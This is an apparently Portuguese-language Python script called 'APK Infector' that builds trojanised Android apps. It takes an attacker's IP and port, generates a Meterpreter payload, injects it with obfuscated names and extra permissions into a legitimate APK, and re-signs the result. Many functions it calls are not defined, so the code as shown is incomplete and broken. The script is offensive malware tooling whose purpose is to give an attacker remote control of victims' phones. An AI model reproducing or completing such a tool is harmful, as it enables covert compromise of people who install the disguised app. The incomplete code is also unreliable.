#!/usr/bin/python3

import os
import subprocess
import argparse
import random
import banner
import shutil

# Cores para melhorar a legibilidade
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def obter_argumentos():
    banner.banner1()
    parser = argparse.ArgumentParser(description=f'{RED}APK Infector v1.0')
    parser._optionals.title = f"{GREEN}Argumentos Opcionais{YELLOW}"

    argumentos_obrigatorios = parser.add_argument_group(f'{RED}Argumentos Obrigatórios{GREEN}')
    argumentos_obrigatorios.add_argument("--lhost", dest="lhost", help="Endereço IP do Atacante", required=True)
    argumentos_obrigatorios.add_argument("--lport", dest="lport", help="Porta do Atacante", required=True)
    argumentos_obrigatorios.add_argument("-n", "--normal-apk", dest="normal_apk", help="Caminho Absoluto do Arquivo APK Legítimo", required=True)
    argumentos_obrigatorios.add_argument("--apk-name", dest="apkName", help="Caminho Absoluto do Arquivo APK Legítimo", required=True)

    return parser.parse_args()

def verificar_dependencias(dependencia, nome):
    # Verifica se a dependência está instalada
    status = os.system(f"which {dependencia} > /dev/null")
    if status == 0:
        print(f"{GREEN}[+] {nome} - OK")
    else:
        # Se não estiver instalada, oferece a opção de instalar
        print(f"{RED}[!] {nome} - 404 NOT FOUND !")
        instalar_dependencia = input(f"{BLUE}\n[?] Deseja instalar agora? (s/n) : ")
        if instalar_dependencia.lower() == "s":
            os.system("apt-get update")
            os.system(f"apt-get install {dependencia}")

def verificar_dependencias_e_atualizacoes():
    print(f"{YELLOW}\n[*] Verificando Dependências \n{WHITE}================================\n\n[:] OBSERVAÇÃO: {GREEN}Jarsigner{WHITE} ou {GREEN}APKsigner{WHITE} é usado para assinar o APK, um deles deve estar instalado no seu sistema")
    
    # Verificar dependências específicas
    verificar_dependencias("apktool", "APKTool")
    verificar_dependencias("jarsigner", "Jarsigner")
    verificar_dependencias("apksigner", "APKsigner")
    verificar_dependencias("zipalign", "ZipAlign")

# Restante do código mantido similar, exceto para funções adicionais e melhor organização.

def main():
    arguments = obter_argumentos()  
    print(f"{YELLOW}\n[*] Gerando Variáveis Aleatórias para Obfuscação")
    VAR1 = gerar_nome_aleatorio()
    VAR2 = gerar_nome_aleatorio()
    VAR3 = gerar_nome_aleatorio()
    VAR4 = gerar_nome_aleatorio()
    VAR5 = gerar_nome_aleatorio()
    VAR6 = gerar_nome_aleatorio()
    VAR7 = gerar_nome_aleatorio()
    VAR8 = gerar_nome_aleatorio()
    apkName = arguments.apkName
    print(f"{GREEN}[+] Gerado com Sucesso!")

    verificar_dependencias_e_atualizacoes()
    gerar_payload_meterpreter(arguments.lhost, arguments.lport)
    decompilar_evil_and_normal_apk()
    modificar_arquivos_apk(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, apkName)
    mover_arquivos_payload_apk_normal(VAR1)
    conectar_meterpreter_apk(VAR1, VAR2, VAR3)
    injetar_permissao_meterpreter()
    remover_duplicatas_AndroidManifest()
    compilar_apk_infectado()
    assinar_apk()
    zipalign_apk()
    limpeza()

if __name__ == '__main__':
    main()
